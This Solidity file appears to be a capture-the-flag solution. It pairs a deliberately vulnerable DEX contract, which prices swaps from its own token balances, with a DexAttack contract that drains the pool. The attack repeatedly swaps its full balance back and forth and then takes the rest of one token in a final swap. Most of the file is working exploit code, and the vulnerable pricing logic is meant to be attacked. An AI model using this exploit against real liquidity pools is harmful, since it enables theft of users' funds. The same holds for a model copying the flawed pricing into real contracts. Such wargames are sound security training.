// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

// 0x8e988DcCe2B558C8EeafcC6C2d5948B418525E7e
// Token 1 0xAA51A6DF058CA0c6C2E20987f7a794E3901675F1
// Token 2 0x9498b9cEA4708e209B802C7b15eD68D071F72778
contract Dex is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address token_address, uint amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint amount) public {
        require(
            (from == token1 && to == token2) ||
                (from == token2 && to == token1),
            "Invalid tokens"
        );
        require(
            IERC20(from).balanceOf(msg.sender) >= amount,
            "Not enough to swap"
        );
        uint swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(
        address from,
        address to,
        uint amount
    ) public view returns (uint) {
        return ((amount * IERC20(to).balanceOf(address(this))) /
            IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(
        address token,
        address account
    ) public view returns (uint) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(
        address dexInstance,
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}

contract DexAttack {
    Dex public dex;
    SwappableToken public token1;
    SwappableToken public token2;

    constructor(Dex _dex, SwappableToken _token1, SwappableToken _token2) {
        dex = _dex;
        token1 = _token1;
        token2 = _token2;
        // Then we have to transfer all of our tokens to the dex
    }

    function attack() public {
        // Approve the dex to spend our tokens
        dex.approve(address(dex), token1.balanceOf(address(this)));
        dex.approve(address(dex), token2.balanceOf(address(this)));
        // Do 5 swaps of 1 token for the other
        bool buyingToken2 = true;
        for (uint i = 0; i < 5; i++) {
            if (buyingToken2) {
                uint amount = token1.balanceOf(address(this));
                dex.swap(address(token1), address(token2), amount);
            } else {
                uint amount = token2.balanceOf(address(this));
                dex.swap(address(token2), address(token1), amount);
            }
            buyingToken2 = !buyingToken2;
        }
        // Finish him off
        dex.swap(
            address(token2),
            address(token1),
            token2.balanceOf(address(dex))
        );
    }
}
